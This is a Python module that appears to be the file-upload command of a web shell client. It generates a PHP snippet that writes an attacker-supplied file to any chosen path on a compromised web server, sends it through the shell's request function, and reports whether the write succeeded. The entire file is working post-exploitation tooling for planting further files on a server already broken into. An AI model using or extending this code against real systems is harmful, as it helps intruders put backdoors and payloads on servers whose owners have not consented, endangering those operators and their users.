from os import path

from libs.config import alias, color
from libs.myapp import send


def get_php(web_file_path: str, force: bool):
    return """if (isset($_FILES)){
    if (%s and file_exists("%s")){
        print("exist");
    }
    else if (move_uploaded_file($_FILES["file"]["tmp_name"], "%s")){
        print("success");
    }
}""" % (str(not force).lower(), web_file_path, web_file_path)


@alias(True, func_alias="u")
def run(file_path: str, web_file_path: str = "", force: bool = False):
    """
    upload

    Upload file to target system.

    eg: upload {file_path} {web_file_path=file_name} {force=False}
    """
    flag = True
    if (not web_file_path):
        web_file_path = path.basename(file_path)
        flag = False
    try:
        data = open(file_path, "rb").read()
    except FileNotFoundError:
        print("\n" + color.red("Local File not exist") + "\n")
        return
    php = get_php(web_file_path, force)
    res = send(php, files={"file": data})
    if (not res):
        return
    text = res.r_text.strip()
    if text == "success":
        if (flag):
            print(color.green(f"\nUpload {file_path} as {web_file_path} success.\n"))
        else:
            print(color.green(f"\nUpload {file_path} success.\n"))
        return True
    elif text == "exist":
        print(color.yellow(f"\n{web_file_path} exist.\n"))
        return True
    else:
        print("\n" + color.red("Upload error / Privileges not enough") + "\n")
